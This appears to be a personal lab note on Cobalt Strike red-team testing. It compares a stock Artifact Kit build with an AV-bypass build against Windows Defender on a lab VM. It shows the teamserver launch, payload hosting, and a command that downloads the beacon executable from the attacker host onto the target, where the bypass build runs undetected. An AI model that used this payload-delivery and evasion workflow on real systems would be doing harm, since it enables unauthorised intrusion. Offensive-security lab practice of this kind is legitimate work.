utilizing script in [[13. artifact-kit-switcher.py setup]] to test to see if we can just switch the `artifact kit` `patch.c` & `bypass-pipe.c` files for AV & Non settings

#### Test 1Artifact  (NO AV Bypass)
replaced `patch.c` and `bypass-pipe.c` with an original version of `4.11`cobalt strike
#### Synopsis
- this should be detected by defender
---------
Ended up using the script that did recompile `arsenal kit`
![[Pasted image 20250407163311.png]]
making sure `DEFENDER` is on in `GUARDIAN`
![[Pasted image 20250407163635.png]]
booting up `teams server`
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[07Apr2025 20:38:11]-[/opt/cobaltstrike/server]
â””â”€# ./teamserver 192.168.127.129 passphrase /opt/cobaltstrike/custom-cobalt/Profiles/custom.profile
```
starting `cobaltstrike`
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[03Apr2025 23:11:03]-[/opt/cobaltstrike/client]
â””â”€# ./cobaltstrike        
```
starting a `http listener`
![[Pasted image 20250407170006.png]]
generating `payloads`
![[Pasted image 20250407170028.png]]
saving to `/home/kali/malware` as `beacon_x64.exe`
![[Pasted image 20250407170122.png]]
navigating to `Site Management` -> `Host File` to host the file
![[Pasted image 20250407170213.png]]
dropping straight onto the dekstop of `Guardian` and it should be caught
```bash
wget http://192.168.127.129:80/test -UseBasicP -OutFile "C:\Users\blaster\Desktop\artkittest.exe" 
```
got caught by defender
![[Pasted image 20250407170333.png]]
and deleted
![[Pasted image 20250407170343.png]]
reverting `GUARDIAN VM` back to `Kinda Fresh` to start testing on the AV Bypass Version

-----------
#### Test 2 Artifact ( AV Bypass)
clearing old `cobaltstrike` data with `./clearteamserverdata`
![[Pasted image 20250407171255.png]]
running `artifact-kit-switcher2.py` with `2` option
![[Pasted image 20250407171608.png]]
starting `cobaltstrike` server
![[Pasted image 20250407171652.png]]
***Because its just replacing the  old `/opt/cobaltstrike/arsenal-kit/dist/arsenal_kit.cna` we shouldnt have to `load` or `unload` but this will test that as well ***

starting `listener` for `http`
![[Pasted image 20250407171856.png]]generating `http` payload and saving as `beacon_x64_2.exe`
![[Pasted image 20250407172023.png]]
`hosting` the file as `/test2`
![[Pasted image 20250407172338.png]]
making sure `DEFENDER` is `ON`
![[Pasted image 20250407172417.png]]
```bash
wget http://192.168.127.129:80/test2 -UseBasicP -OutFile "C:\Users\blaster\Desktop\artkittest.exe" 
```
![[Pasted image 20250407172501.png]]
double clicking `artkittest.exe` to see if beacon gets caught
works
![[Pasted image 20250407172804.png]]